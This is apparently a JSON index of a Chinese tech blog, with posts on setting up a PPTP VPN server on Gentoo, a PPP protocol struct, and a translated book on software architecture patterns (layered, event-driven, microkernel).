{"meta":{"title":"芯机智","subtitle":null,"description":null,"author":"madhex","url":"http://demonelf.github.io"},"pages":[{"title":"所有分类","date":"2019-08-28T09:02:26.604Z","updated":"2019-08-28T08:59:53.839Z","comments":true,"path":"categories/index.html","permalink":"http://demonelf.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Gentoo下利用pptpd搭建PPTP服务器 ","slug":"NETWORK/Gentoo下利用pptpd搭建PPTP服务器 ","date":"2019-08-29T06:30:48.766Z","updated":"2019-08-29T06:29:11.505Z","comments":true,"path":"NETWORK/Gentoo下利用pptpd搭建PPTP服务器 .html","link":"","permalink":"http://demonelf.github.io/NETWORK/Gentoo下利用pptpd搭建PPTP服务器 .html","excerpt":"首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。接着安装必要软件 emerge ppp emerge pptpd 然后修改配置文件先是pptpd的配置文件 /etc/pptpd.conf12345ppp /usr/sbin/pppdoption /etc/ppp/options.pptpdlogwtmplocalip 172.16.0.1remoteip 172.16.0.2-254","text":"首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。接着安装必要软件 emerge ppp emerge pptpd 然后修改配置文件先是pptpd的配置文件 /etc/pptpd.conf12345ppp /usr/sbin/pppdoption /etc/ppp/options.pptpdlogwtmplocalip 172.16.0.1remoteip 172.16.0.2-254 接着是ppp的配置文件 /etc/ppp/options.pptpd12ms-dns 8.8.8.8ms-dns 8.8.4.4 最后是用户密码文件 /etc/ppp/chap-secret12#name server secret iptest@test.com pptpd test * 第一项是登录vpn时使用的用户名，第二项是vpn服务器名（pptpd，l2tpd，xl2tpd等，也可以用*号），第三项是密码，第四项是分配给客户端的ip，如果是＊号，vpn服务器则会从自己的配置文件中选择一个ip分配给客户端。 开启系统的封包转发： echo 1 &gt; /proc/sys/net/ipv4/ip_forward 最后别忘了启动pptpd服务 /etc/init.d/pptpd start gentoo下客户端示例 pptp 192.168.2.12 user test@test.com password test","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"vpn系列文章概述","slug":"VPN系列之五花八门/vpn系列文章概述","date":"2019-08-29T05:56:12.685Z","updated":"2019-08-29T05:27:31.371Z","comments":true,"path":"VPN系列之五花八门/vpn系列文章概述.html","link":"","permalink":"http://demonelf.github.io/VPN系列之五花八门/vpn系列文章概述.html","excerpt":"我们要讨论的相关vpn l2tp pptp ipsec websocket vpn dns vpn mpls vpn 由于ppp协议是以上大部分vpn的核心技术,所以我们还要讨论ppp相关技术.","text":"我们要讨论的相关vpn l2tp pptp ipsec websocket vpn dns vpn mpls vpn 由于ppp协议是以上大部分vpn的核心技术,所以我们还要讨论ppp相关技术.","categories":[{"name":"VPN系列之五花八门","slug":"VPN系列之五花八门","permalink":"http://demonelf.github.io/categories/VPN系列之五花八门/"}],"tags":[]},{"title":"ppp协议总结","slug":"VPN系列之五花八门/ppp协议总结","date":"2019-08-29T05:22:47.788Z","updated":"2019-08-29T05:20:54.174Z","comments":true,"path":"VPN系列之五花八门/ppp协议总结.html","link":"","permalink":"http://demonelf.github.io/VPN系列之五花八门/ppp协议总结.html","excerpt":"协议规范实现原理1234567891011121314151617181920212223242526272829303132333435363738struct ppp_info&#123; int unit; /**/ int dev_fd; /**/ int lcp_fd; /**/ int ppp_fd; /**/ int remote_id; /**/ char *user; /* Username for authentication */ char *passwd; /* Password for authentication */ char *ifname; char attach_inter[16]; unsigned char distance; unsigned char weight; unsigned char gateway; unsigned char dns; unsigned char auth; unsigned char auth_type; unsigned char down_flag; //避免PPP主动down掉和手动清除冲突 unsigned int unique; unsigned int dns_value; unsigned int wins_value; char usergrp[MAXNAMELEN]; struct prefix_ipv4 localaddr; unsigned int peer_address; //tunnip int lcp_detect_interval_time; //for change interval time of lcp echo request int lcp_detect_lost_times; //for change times of no respons lcp echo request struct thread * lcp_thread; struct thread * ipcp_rthread; void *conn; void *priv_data; int natid; int mtu; Ppp_if_type iftype; int (*manage_auto_down) (char *ifname); int (*ipcp_up_cb) (struct ppp_cb_info *cb_info); int (*ipcp_down_cb) (struct ppp_cb_info *cb_info); int (*lcp_auth) (char *name, char *group, char *password, unsigned char *challenge, int unit, int type); int (*check_rqci)(__u32 addr);&#125;;","text":"协议规范实现原理1234567891011121314151617181920212223242526272829303132333435363738struct ppp_info&#123; int unit; /**/ int dev_fd; /**/ int lcp_fd; /**/ int ppp_fd; /**/ int remote_id; /**/ char *user; /* Username for authentication */ char *passwd; /* Password for authentication */ char *ifname; char attach_inter[16]; unsigned char distance; unsigned char weight; unsigned char gateway; unsigned char dns; unsigned char auth; unsigned char auth_type; unsigned char down_flag; //避免PPP主动down掉和手动清除冲突 unsigned int unique; unsigned int dns_value; unsigned int wins_value; char usergrp[MAXNAMELEN]; struct prefix_ipv4 localaddr; unsigned int peer_address; //tunnip int lcp_detect_interval_time; //for change interval time of lcp echo request int lcp_detect_lost_times; //for change times of no respons lcp echo request struct thread * lcp_thread; struct thread * ipcp_rthread; void *conn; void *priv_data; int natid; int mtu; Ppp_if_type iftype; int (*manage_auto_down) (char *ifname); int (*ipcp_up_cb) (struct ppp_cb_info *cb_info); int (*ipcp_down_cb) (struct ppp_cb_info *cb_info); int (*lcp_auth) (char *name, char *group, char *password, unsigned char *challenge, int unit, int type); int (*check_rqci)(__u32 addr);&#125;; void LcpLinkFailure (f) lcp_close(f-&gt;unit, “Peer not responding”);","categories":[{"name":"VPN系列之五花八门","slug":"VPN系列之五花八门","permalink":"http://demonelf.github.io/categories/VPN系列之五花八门/"}],"tags":[]},{"title":"软件架构模式","slug":"DEVELOP/软件架构模式","date":"2019-08-29T05:14:34.950Z","updated":"2019-08-29T05:12:37.348Z","comments":true,"path":"DEVELOP/软件架构模式.html","link":"","permalink":"http://demonelf.github.io/DEVELOP/软件架构模式.html","excerpt":"软件架构模式 Mark Richards 著版权归 © 2015 O’Reilly Media, Inc. 所有. 原书发布链接为Software Architecture Patterns.","text":"软件架构模式 Mark Richards 著版权归 © 2015 O’Reilly Media, Inc. 所有. 原书发布链接为Software Architecture Patterns. 译员信息 本书的译员均来自 开发技术前线 www.devtf.cn。 译者 个人简介 Mr.Simple 乐于分享，热爱开源的工程师，个人博客 chaossss 追风筝的吃货，汪～。个人博客 Allenlsy 计算机科学爱好者，Rails程序员。个人博客 BillonWang 做好玩的事情，交好玩的朋友。个人博客 dupengwei 乐于分享的移动互联网开发工程师 Charli Hu 喜欢英语，不放弃编程的菇凉。 目录 简介 第一章 分层架构 第二章 事件驱动架构 第三章 微内核架构 第四章 微服务架构 第五章 基于空间的架构 附录A 关于作者 简介对程序员来说很常见一种情况是在没有合理的程序架构时就开始编程，没有一个清晰的和定义好的架构的时候，大多数开发者和架构师通常会使用标准式的传统分层架构模式（也被称为多层架构）——通过将源码模块分割为几个不同的层到不同的包中。不幸的是，这种编码方式会导致一系列没有组织性的代码模块，这些模块缺乏明确的规则、职责和同其他模块之间的关联。这通常被称为架构大泥球。 应用程序缺乏合理的架构一般会导致程序过度耦合、容易被破坏、难以应对变化，同时很难有一个清晰的版本或者方向性。这样的结果是，如果你没有充分理解程序系统里每个组件和模块，就很难定义这个程序的结构特征。有关于程序的部署和维护的基本问题都难以回答，比如：程序架构是什么规模?应用程序有什么性能特点?应用程序有多容易应对变化?应用程序的部署特点是什么?架构是如何反应的? 架构模式帮助你定义应用程序的基本特征和行为。例如，一些架构模式会让程序自己自然而然地朝着具有良好伸缩性的方向发展，而其他架构模式会让程序朝着高度灵活的方向发展。知道了这些特点，了解架构模式的优点和缺点是非常必要的，它帮助我们选择一个适合自己特定的业务需求和目标的的程序。​作为一个架构师,你必须证明你的架构模式的决策是正确的,特别是当需要选择一个特定的体系结构模式或方法的时候。这本迷你书的目的就是给你足够的信息让你去做出正确的架构决策。 第一章 分层架构分层架构是一种很常见的架构模式，它也叫N层架构。这种架构是大多数Jave EE应用的实际标准，因此很多的架构师，设计师，还有程序员都知道它。许多传统IT公司的组织架构和分层模式十分的相似。所以它很自然的成为大多数应用的架构模式。 模式分析分层架构模式里的组件被分成几个平行的层次，每一层都代表了应用的一个功能(展示逻辑或者业务逻辑)。尽管分层架构没有规定自身要分成几层几种，大多数的结构都分成四个层次:展示层，业务层，持久层，和数据库层。如表1-1，有时候，业务层和持久层会合并成单独的一个业务层，尤其是持久层的逻辑绑定在业务层的组件当中。因此，有一些小的应用可能只有3层，一些有着更复杂的业务的大应用可能有5层或者更多的分层。 分层架构中的每一层都着特定的角色和职能。举个例子，展示层负责处理所有的界面展示以及交互逻辑，业务层负责处理请求对应的业务。架构里的层次是具体工作的高度抽象，它们都是为了实现某种特定的业务请求。比如说展示层并不需要关心怎样得到用户数据，它只需在屏幕上以特定的格式展示信息。业务层并不关心要展示在屏幕上的用户数据格式，也不关心这些用户数据从哪里来。它只需要从持久层得到数据，执行与数据有关的相应业务逻辑，然后把这些信息传递给展示层。 分层架构的一个突出特性是组件间关注点分离 (separation of concerns)。一个层中的组件只会处理本层的逻辑。比如说，展示层的组件只会处理展示逻辑，业务层中的组件只会去处理业务逻辑。多亏了组件分离，让我们更容易构造有效的角色和强力的模型。这样应用变的更好开发，测试，管理和维护。 关键概念注意表1-2中每一层都是封闭的。这是分层架构中非常重要的特点。这意味request必须一层一层的传递。举个例子，从展示层传递来的请求首先会传递到业务层，然后传递到持久层，最后才传递到数据层。 那么为什么不允许展示层直接访问数据层呢。如果只是获得以及读取数据，展示层直接访问数据层，比穿过一层一层来得到数据来的快多了。这涉及到一个概念:层隔离。 层隔离就是说架构中的某一层的改变不会影响到其他层:这些变化的影响范围限于当前层次。如果展示层能够直接访问持久层了，假如持久层中的SQL变化了，这对业务层和展示层都有一定的影响。这只会让应用变得紧耦合，组件之间互相依赖。这种架构会非常的难以维护。 从另外一个方面来说，分层隔离使得层与层之间都是相互独立的，架构中的每一层的互相了解都很少。为了说明这个概念的牛逼之处，想象一个超级重构，把展示层从JSP换成JSF。假设展示层和业务层的之间的联系保持一致，业务层不会受到重构的影响，它和展示层所使用的界面架构完全独立。 然而封闭的架构层次也有不便之处，有时候也应该开放某一层。如果想往包含了一些由业务层的组件调用的普通服务组件的架构中添加一个分享服务层。在这个例子里，新建一个服务层通常是一个好主意，因为从架构上来说，它限制了分享服务访问业务层(也不允许访问展示层)。如果没有隔离层，就没有任何架构来限制展示层访问普通服务，难以进行权限管理。 在这个例子中，新的服务层是处于业务层之下的，展示层不能直接访问这个服务层中的组件。但是现在业务层还要通过服务层才能访问到持久层，这一点也不合理。这是分层架构中的老问题了，解决的办法是开放某些层。如表1-3所示，服务层现在是开放的了。请求可以绕过这一层，直接访问这一层下面的层。既然服务层是开放的，业务层可以绕过服务层，直接访问数据持久层。这样就非常合理。 开放和封闭层的概念确定了架构层和请求流之间的关系，并且给设计师和开发人员提供了必要的信息理解架构里各种层之间的访问限制。如果随意的开放或者封闭架构里的层，整个项目可能都是紧耦合，一团糟的。以后也难以测试，维护和部署。 示例为了演示分层架构是如何工作的，想象一个场景，如表1-4，用户发出了一个请求要获得客户的信息。黑色的箭头是从数据库中获得用户数据的请求流，红色箭头显示用户数据的返回流的方向。在这个例子中，用户信息由客户数据和订单数组组成(客户下的订单)。 用户界面只管接受请求以及显示客户信息。它不管怎么得到数据的，或者说得到这些数据要用到哪些数据表。如果用户界面接到了一个查询客户信息的请求，它就会转发这个请求给用户委托(Customer Delegate)模块。这个模块能找到业务层里对应的模块处理对应数据(约束关系)。业务层里的customer object聚合了业务请求需要的所有信息(在这个例子里获取客户信息)。这个模块调用持久层中的 customer dao 来得到客户信息，调用order dao来得到订单信息。这些模块会执行SQL语句，然后返回相应的数据给业务层。当 customer object收到数据以后，它就会聚合这些数据然后传递给 customer delegate,然后传递这些数据到customer screen 展示在用户面前。 从技术的角度来说，有很多的方式能够实现这些模块。比如说在Java平台中，customer screen 对应的是 (JSF) Java Server Faces ,用 bean 组件来实现 customer delegate。用本地的Spring bean或者远程的EJB3 bean 来实现业务层中的customer object。上例中的数据访问可以用简单的POJP’s(Plain Old Java Objects)，或者可以用MyBatis，还可以用JDBC或者Hibernate 查询。Microsoft平台上，customer screen能用 .NET 库的ASP模块来访问业务层中的C#模块，用ADO来实现用户和订单数据的访问模块。 注意事项分层架构是一个很可靠的架构模式。它适合大多数的应用。如果你不确定在项目中使用什么架构，分层架构是再好不过的了。然后，从架构的角度上来说，选择这个模式还要考虑很多的东西。 第一个要注意的就是 污水池反模式(architecture sinkhole anti-pattern)。在这个模式中，请求流只是简单的穿过层次，不留一点云彩，或者说只留下一阵青烟。比如说界面层响应了一个获得数据的请求。响应层把这个请求传递给了业务层，业务层也只是传递了这个请求到持久层，持久层对数据库做简单的SQL查询获得用户的数据。这个数据按照原理返回，不会有任何的二次处理，返回到界面上。 每个分层架构或多或少都可能遇到这种场景。关键在于这样的请求有多少。80-20原则可以帮助你确定架构是否处于反污水模式。大概有百分之二十的请求仅仅是做简单的穿越，百分之八十的请求会做一些业务逻辑操作。然而，如果这个比例反过来，大部分的请求都是仅仅穿过层，不做逻辑操作。那么开放一些架构层会比较好。不过由于缺少了层次隔离，项目会变得难以控制。 模式分析下面的的表里分析了分层架构的各个方面。 整体灵活性评级:低分析:总体灵活性是响应环境变化的能力。尽管分层模式中的变化可以隔绝起来，想在这种架构中做一些也改变也是并且费时费力的。分层模式的笨重以及经常出现的组件之间的紧耦合是导致灵活性降低的原因。 易于部署评级:低分析:这取决于你怎么发布这种模式，发布程序可能比较麻烦，尤其是很大的项目。一个组件的小小改动可能会影响到整个程序的发布(或者程序的大部分)。发布必须是按照计划，在非工作时间或者周末进行发布。因此。分层模式导致应用发布一点也不流畅，在发布上降低了灵活性。 可测试性评级:高分析:因为组件都处于各自的层次中，可以模拟其他的层，或者说直接去掉层，所以分层模式很容易测试。开发者可以单独模拟一个展示组件，对业务组件进行隔绝测试。还可以模拟业务层来测试某个展示功能。 性能评级:低分析:尽管某些分层架构的性能表现的确不错，但是这个模式的特点导致它无法带来高性能。因为一次业务请求要穿越所有的架构层，做了很多不必要的工作。 伸缩性评级:低分析:由于这种模式以紧密耦合的趋势在发展，规模也比较大，用分层架构构建的程序都比较难以扩展。你可以把各个层分成单独的物理模块或者干脆把整个程序分成多个节点来扩展分层架构，但是总体的关系过于紧密，这样很难扩展。 易开发性评级:容易分析:在开发难度上面，分层架构得到了比较高的分数。因为这种架构对大家来说很熟悉，不难实现。大部分公司在开发项目的都是通过层来区分技术的，这种模式对于大多数的商业项目开发来说都很合适。公司的组织架构和他们软件架构之间的联系被戏称为”Conway’s law”。你可以Google一下查查这个有趣的联系。 第二章 事件驱动架构 译者注：文章中 mediator 及 broker 的概念很容易混淆，在文章的结尾处译者对两者的区别（还有 proxy）进行了一定的阐述 事件驱动架构模式是一种主流的异步分发事件架构模式，常用于设计高度可拓展的应用。当然了，它有很高的适应性，使得它在小型应用、大型应用、复杂应用中都能表现得很好。事件驱动架构模式由高度解耦、单一目的的事件处理组件构成，这些组件负责异步接收和处理事件。 事件驱动架构模式包含了两种主要的拓扑结构：中介(mediator)拓扑结构和代理(broker)拓扑结构。 mediator 拓扑结构通常在你需要在事件内使用一个核心中介分配、协调多个步骤间的关系、执行顺序时使用；而代理拓扑结构则在你想要不通过一个核心中介将多个事件串联在一起时使用。由于这两种结构在结构特征和实现策略上有很大的差别，所以如果你想要在你的应用中使用它们的话，一定要深入理解两者的技术实现细节，从而为你的实际使用场景选择最合理的结构。 中介 ( Mediator )拓扑结构中介拓扑结构适合用于拥有多个步骤，并需要在处理事件时能通过某种程度的协调将事件分层的场景，举例来说吧：假设你现在需要进行股票交易，那你首先需要证券所批准你进行交易，然后检查进行这次交易是否违反了股票交易的某种规定，检查完成后将它交给一个经纪人，计算佣金，最后与经纪人确认交易。以上所有步骤都需要通过中介进行某种程度的分配和协调，以决定各个步骤的执行顺序，判断哪些步骤可以并行，哪些步骤可以串行。 在中介拓扑结构中主要有四种组件：事件队列（event queue）, 事件中介, 事件通道（event channel）, 和 事件处理器（event processor）。当事件流需要被处理，客户端将一个事件发送到某个事件队列中，由消息队列将其运输给事件中介进行处理和分发。事件中介接收到该消息后，并通过将额外的异步事件发送给事件通道，让事件通道执行该异步事件中的每一个步骤，使得事件中介能够对事件进行分配、协调。同时，又因为事件处理器是事件通道的监听器，所以事件通道对异步事件的处理会触发事件处理器的监听事件，使事件处理器能够接收来自事件中介的事件，执行事件中具体的业务逻辑，从而完成对传入事件的处理。事件驱动架构模式中的中介拓扑模式结构大体如下图： 在事件驱动架构中拥有十几个，甚至几百个事件队列是很常见的情况，该模式并没有对事件队列的实现有明确的要求，这就意味着事件队列可以是消息队列，Web 服务端，或者其它类似的东西。 在事件驱动架构模式中主要有两种事件：初始事件和待处理事件。初始事件是中介所接收到的最原始的事件，没有经过其他组件的处理；而待处理事件是由事件中介生成，由事件处理器接收的组件，不能把待处理事件看作初始事件经过处理后得到的事件，两者是完全不同的概念。 事件中介负责分配、协调初始事件中的各个待执行步骤，事件中介需要为每一个初始事件中的步骤发送一个特定的待处理事件到事件通道中，触发事件处理器接收和处理该待处理事件。这里需要注意的是：事件 中介没有真正参与到对初始事件必须处理的业务逻辑的实现之中；相反，事件中介只是知道初始事件中有哪些步骤需要被处理。 事件中介通过事件通道将与初始事件每一个执行步骤相关联的特定待处理事件传递给事件处理器。尽管我们通常在待处理事件能被多个事件处理器处理时才会在中介拓扑结构中使用 消息主题，但事件通道仍可以是消息队列或 消息主题。（但需要注意的是，尽管在使用 消息主题 时待处理事件能被多个事件处理器处理，但由于接收到的待处理事件各异，所以对其处理的操作也各不相同） 为了能顺利处理待处理事件，事件处理器组件中包含了应用的业务逻辑。此外，事件处理器作为事件驱动架构中的组件，不依赖于其他组件，独立运作，高度解耦，在应用或系统中完成特定的任务。当事件处理器需要处理的事件从细粒度（例如：计算订单的营业税）变为粗粒度（例如：处理一项保险索赔事务），必须要注意的是：一般来说，每一个事件处理器组件都只完成一项唯一的业务工作，并且事件处理器在完成其特定的业务工作时不能依赖其他事件处理器。 虽然事件中介有许多方法可以实现，但作为一名架构工程师，你应该了解所有实现方式，以确保你能为你的实际需求选择了最合适的事件中介。 事件中介最简单、常见的实现就是使用开源框架，例如：Spring Integration，Apache Camel，或 Mule ESB。事件流在这些开源框架中通常用 Java 或 域特定语言（domain-specific language）。在调节过程和业务流程都很复杂的使用场景下，你可以使用业务流程执行语言（BPEL - business process execution language）结合类似开源框架 Apache ODE 的 BPEL 引擎进行开发。BPEL 是一种基于 XML 的服务编制编程语言，它为处理初始事件时需要描述的数据和步骤提供了描述。对每一个拥有复杂业务流程（包括与用户交互的执行步骤）的大型应用来说，你可以使用类似 jBPM 的业务处理管理系统（business process manager）实现事件中介。 如果你需要使用中介拓扑结构，那么理解你的需求，并为其匹配恰当的事件中介实现是构建事件驱动架构过程中至关重要的一环。使用开源框架去解决非常复杂的业务处理、管理、调节事件，注定会失败，因为开源框架只是用 BPM 的方式解决了一些简单的事件分发逻辑，比起你的业务逻辑，其中的事件分发逻辑简直是九牛一毛。 为了解释清楚中介拓扑结构是怎么运作的，我假设你在某家保险公司买了保险，成为了受保人，然后你打算搬家。在这种情况下，初始事件就是重定位事件，或者其他类似的事件。与重定位事件相关的处理步骤就像下图展示的那样，处于事件中介之中。对每一个初始事件的传入，事件中介都会创建一个待处理事件（例如：改变地址，重新计算保险报价，等等……），并将它发送给事件通道，等待发出响应的事件处理器处理待处理事件（例如：客户改变地址的操作流程、报价计算流程，等等……）。直到初始事件中的每一个需要处理的步骤完成了，这项处理才会继续（例如：把所有手续都完成之后，保险公司才会帮你改变地址）。事件中介中，重新报价和更新理赔步骤上面的直线表示这些步骤可以并行处理。 代理 (Broker) 拓扑结构代理拓扑结构与中介拓扑结构不同之处在于：代理拓扑结构中没有核心的事件中介；相反，事件流在代理拓扑结构中通过一个轻量的消息代理（例如：ActiveMQ, HornetQ，等等……）将消息串联成链状，分发至事件处理器组件中进行处理。代理扑结构适用的使用场景大致上具有以下特征：你的事件处理流相对来说比较简单，而且你不想（不需要）使用核心的事件分配、调节机制以提高你处理事件的效率。 在代理拓扑结构中主要包括两种组件：代理和事件处理器。代理可被集中或相互关联在一起使用，此外，代理中还可以包含所有事件流中使用的事件通道。 存在于代理组件中的事件通道可以是消息队列，消息主题,或者是两者的组合。 代理拓扑结构大致如下图，如你所见，在这其中没有一个核心的事件中介组件控制和分发初始事件；相反，每一个事件处理器只负责处理一个事件，并向外发送一个事件，以标明其刚刚执行的动作。例如，假设存在一个事件处理器用于平衡证券交易，那么事件处理器可能会接受一个拆分股票的初始事件，为了处理这项初始事件，事件处理器则需要重新平衡股票的投资金额，而这个重新平衡的事件将由另一个事件处理器接收、处理。在这其中有一个细节需要注意：处理初始事件后，由事件处理器发出的事件不被其他事件处理器接收、处理的情况时常会发生，尤其是你在为应用添加功能和进行功能拓展时，这种情况更为常见。 为了阐明代理拓扑结构的运行机制，我会用一个与讲解中介拓扑结构时类似的例子（受保人旅行的例子）进行解释。因为在代理拓扑结构中没有核心事件中介接收初始事件，那么事件将由客户处理组件直接接收，改变客户的地址，并发出一个事件告知系统客户的地址被其进行了改变（例如：改变地址的事件）。在这个例子中：有两个事件处理器会与改变地址的事件产生关联：报价处理和索赔处理。报价事件处理器将根据受保人的新地址重新计算保险的金额，并发出事件告知系统该受保人的保险金额被其改变。而索赔事件处理器将接受到相同的改变地址事件，不同的是，它将更新保险的赔偿金额，并发出一个更新索赔金额事件告知系统该受保人的赔偿金额被其改变。当这些新的事件被其他事件处理器接收、处理，使事件链一环扣一环地交由系统处理，直到事件链上的所有事件都被处理完，初始事件的处理才算完成。 如上图所示，代理拓扑结构的设计思想就是将对事件流的处理转换为对事件链的业务功能处理，把代理拓扑结构看作是接力比赛是最好的理解方式：在一场4*100的接力比赛中，每一位运动员都需要拿着一根接力棒跑100米，运动员跑完自己的100米后需要将接力棒传递给下一位运动员，直到最后一位运动员拿着接力棒跑过终点线，整场接力比赛才算结束。根据这样的逻辑我们还可以知道：在代理拓扑结构中，一旦某个事件处理器将事件传递给另一个事件处理器，那么这个事件处理器不会与该事件的后续处理产生任何联系。 顾虑实现事件驱动架构模式相对于实现其他架构模式会更困难一些，因为它通过异步处理进行事件分发。当你需要在你的应用中使用这种架构模式，你必须处理各种由事件分发处理带来的问题，例如：远程操作功能的可用性，缺少权限，以及在代理或中介中处理事件失败时，用于处理这种情况的重连逻辑。如果你不能很好地解决这些问题，那你的应用一定会出现各种 Bug，让开发团队痛苦不已。 在选择事件驱动架构时还有一点需要注意：在处理单个业务逻辑时，这种架构模式不能处理细粒度的事务。因为事件处理器都高度解耦、并且广泛分布，这使得在这些事件处理器中维持一个业务单元变得非常困难。因此，当你使用这种架构模式架构你的应用时，你必须不断地考虑哪些事件能单独被处理，哪些不能，并为此设计相应事件处理器的处理粒度。如果你发现你需要将一个业务单元切割成许多子单元，并一一匹配相应的事件处理器，那你就要为此进行代码设计；如果你发现你用多个不同的事件处理器处理的哪些业务其实是可以合并到一个业务事件之中的，那么这种模式可能并不适合你的应用，又或者是你的设计出了问题。 使用事件驱动架构模式最困难的地方就在于架构的创建、维护、以及对事件处理器的管理。通常每一个事件都拥有其指定的事件处理协议（例如：传递给事件处理器的数据类型、数据格式），这就使得设下标准的数据格式成为使用事件驱动架构模式中至关重要的一环（例如：XML，JSON，Java 对象，等等……），并在架构创建之初就为这些数据格式授权，以便处理。 模式分析下面是基于对常见的架构模式特征进行评价的标准，对事件驱动架构模式所作的实际分析，评价是以常见的架构模式的相似实现作为标准进行的，如果你想知道进行对比的其他架构模式对应的特征，可以结尾处查看 附录A 的汇总表。 整体灵活性评价：高分析：整体灵活性用于评价架构能否在不断改变的使用场景下快速响应，因为事件处理器组件使用目的单一、高度解耦、与其他事件处理器组件相互独立，不相关联，那么发生的改变对一个或多个事件处理器来说普遍都是独立的，使得对改变的反馈非常迅速，不需要依赖其他事件处理器的响应作出处理。 易于部署评价：高分析：总的来看，事件驱动架构模式由于其高度解耦的事件处理器组件的存在，对事件的部署相对来说比较容易，而使用代理拓扑结构比使用中介拓扑结构进行事件调度会更容易一些，主要是因为在 中介拓扑结构中事件处理器与事件中介紧密地耦合在一起：事件处理器中发生改变后，事件中介也随之改变，如果我们需要改变某个被处理的事件，那么我们需要同时调度事件处理器和事件中介。 可测试性评价：低分析：虽然在事件驱动架构模式中进行单元测试并不困难，但如果我们要进行单元测试，我们就需要某种特定的测试客户端或者是测试工具产生事件，为单元测试提供初始值。此外，由于事件驱动架构模式是异步进行事件分发的，其异步处理的特性也为单元测试带来了一定的困难。 Performance 性能评价：高分析：对消息传递的架构可能会让设计出来的事件驱动架构的表现不如我们的期望，但通常来说，该模式都能通过其异步处理的特性展示优秀的性能表现；换句话来说，高度解耦，异步并行操作大大减少了传递消息过程中带来的时间开销。 伸缩性评价：高分析：事件驱动架构中的高度解耦、相互独立的事件处理器组件的存在，使得可拓展性成为该架构与生俱来的优点。架构的这些特定使得事件处理器能够进行细粒度的拓展，使得每一个事件处理器都能单独被拓展，而不影响其他事件处理器。 易于开发评价：低分析：由于使用事件驱动架构进行开发需要考虑其异步处理机制、协议创建流程，并且开发者需要用代码为事件处理器和操作失败的代理提供优秀的错误控制环境，无疑使得用事件驱动架构进行开发会比使用其他架构进行开发要困难一些。 译者注读完整篇文章，我相信大家对 mediator 与 broker 这两个概念有一个大致的印象，但就两者的译文来看，中介和代理似乎没什么区别，尤其是了解 proxy 的读者会更加困惑，这三者之间到底是什么关系？它们的概念是互通的吗？为了解决这种混淆，译者将在此阐述三者间的区别： 假如现在我有一个事件/事件流需要被处理，那么使用 mediator、broker、proxy 处理事件的区别在哪里呢？ 如果我们使用 mediator，那就意味着我将把事件流交给 mediator，mediator 会帮我把事件分解为多个步骤，并分析其中的执行逻辑，调整和分发事件（例如判断哪些事件可以并行，哪些事件可以串行），然后根据 mediator 分解、调节的结果去执行事件中的每一个步骤，把所有步骤完成后，就能把需要处理的事件处理好。 如果我们使用 broker，那就意味着我将把事件交给 broker，broker 获得事件后会把事件发出去（在本文中为：通知架构中所有可用的事件处理器），事件处理器们接收到事件以后，判断处理这个事件是否为自己的职责之一，如果不是则无视，与自己有关则把需要完成的工作完成，完成后如果事件还有后续需要处理的事件，则通过 broker 再次发布，再由相关的事件处理器接收、处理。以这样的方式将事件不断分解，沿着事件链一级一级地向下处理子事件，直到事件链中的所有事件被完成，我的事件也就处理好了。 如果我们使用 proxy，那就意味着我自己对需要处理的事件进行了分解，然后把不同的子事件一一委托给不同的 proxy，由被委托的 proxy 帮我完成子事件，从而完成我要做的事件。 第三章 微内核架构微内核架构模式(也称为插件化应用架构)对于基于产品的应用程序来说是一个很自然的选择。基于产品的应用是指一个经过打包的、可以通过版本下载的一个典型的第三方产品。然而，很多公司也会开发和发布他们的内部商业软件，完整的版本号、发布日志和可插拔的新特性，这些就非常符合微内核架构的思想。微内核架构模式可以通过插件的形式添加额外的特性到核心系统中，这提供了很好的扩展性，也使得新特性与核心系统隔离开来。( 译者注: 比如，著名的Eclipse IDE就是基于插件化开发的，eclipse核心更像是一个微内核，或者我们可把它叫做开放平台，其他的功能通过安装插件的形式添加到eclipse中。 ) 模式描述微内核架构主要需要考虑两个方面: 核心系统和插件模块。应用逻辑被划分为独立的插件模块和核心系统，这样就提供良好的可扩展性、灵活性，应用的新特性和自定义处理逻辑也会被隔离。图3-1演示了基本的微内核架构。 微内核架构的核心系统一般情况下只包含一个能够使系统运作起来的最小化模块。很多操作系统的实现就是使用微内核架构，因此这也是该架构名字的由来。从商业应用的角度看，核心系统通常是为特定的使用场景、规则、或者复杂条件处理定义了通用的业务逻辑，而插件模块根据这些规则实现了具体的业务逻辑。 插件模块是一个包含专业处理、额外特性的独立组件，自定义代码意味着增加或者扩展核心系统以达到产生附加的业务逻辑的能力。通常，插件模块之间应该是没有任何依赖性的，但是你也可以设计一个需要依赖另一个插件的插件。但无论如何，使得插件之间可以通信的同时避免插件之间产生依赖又是一个特别重要的问题。 核心系统需要了解插件模块的可用性以及如何获取到它们。一个通用的实现方法是通过一组插件注册表。这个插件注册表含有每个插件模块的信息，包括它的名字、数据规约和远程访问协议(取决于插件如何与核心系统建立连接)。例如，一个税务软件的用于标识高风险的税务审计插件可能会有一个含有插件名(比如AuditChecker)的注册入口，数据规约(输入数据、输出数据)和规约格式( 比如xml )。如果这个插件是通过SOAP服务访问，那么它可能会包含一个WSDL (Web Services Definition Language). 插件模块可以通过多种方式连接到核心系统，包括OSGi ( open service gateway initiative )、消息机制、web服务或者直接点对点的绑定 ( 比如对象实例化，即依赖注入 )。你使用的连接类型取决于你构建的应用类型和你的特殊需求（比如单机部署还是分布式部署）。微内核架构本身没有指定任何的实现方式，唯一的规定就是插件模块之间不要产生依赖。 插件和核心系统的通信规范包含标准规范和自定义规范。自定义规范典型的使用场景是插件组件是被第三方构建的。在这种情况下，通常是在第三方插件规约和你的标准规范创建一个Adapter来使核心系统根本不需要知道每个插件的具体细节。当创建标准规范 ( 通常是通过XML或者Java Map )时，从一开始就创建一个版本策略是非常重要的。 架构示例也许微内核架构的最好示例就是大家熟知的Eclipse IDE了。下载最基本的Eclipse后，它只能提供一个编辑器。然后，一旦你开始添加插件，它就变成一个高度可定制化和非常有用的产品（译者注 : 更多内容大家可以参考 开源软件架构 卷1：第6章 Eclipse之一 ）。浏览器是另一个使用微内核架构的产品示例，它由一个查看器和其他扩展的插件组成。 